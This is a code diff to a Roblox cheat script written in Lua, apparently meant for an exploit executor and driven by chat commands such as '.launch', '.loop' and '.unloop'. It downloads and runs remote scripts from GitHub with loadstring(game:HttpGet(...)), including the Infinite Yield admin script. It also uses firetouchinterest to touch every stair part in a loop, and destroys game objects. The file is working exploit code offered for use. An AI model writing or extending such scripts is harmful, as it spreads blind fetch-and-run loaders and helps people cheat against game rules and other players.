@@ -1,9 +1,9 @@
---Made By @RblxBypassTg / @WgOI03 / @InfInfInfC = Tester
+    --Made By @RblxBypassTg / @WgOI03 / @InfInfInfC = Tester
 
 
 local useless = game.Workspace.Stairs.ss
 useless:Destroy()
-
+wait(1)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 print("Lauched")
 local Player = game:GetService("Players").LocalPlayer
@@ -25,5 +25,18 @@ Player.Chatted:Connect(function(Message)
 		humanoid:TakeDamage(100)
         elseif Message == ".launch" then
             loadstring(game:HttpGet("https://raw.githubusercontent.com/RoExp/Dolce-Milk-Script/main/DolceUpdated"))()
+            local Stop = false
+
+    elseif Message == ".loop" then
+        Stop = false
+        repeat
+            for i, Stairs in pairs(game:GetService("Workspace").Stairs:GetChildren()) do
+                firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, Stairs, 0)
+            end
+            wait(.75)
+        until Stop == true
+        
+    elseif Message == ".unloop" then
+        Stop = true
 	end
 end)
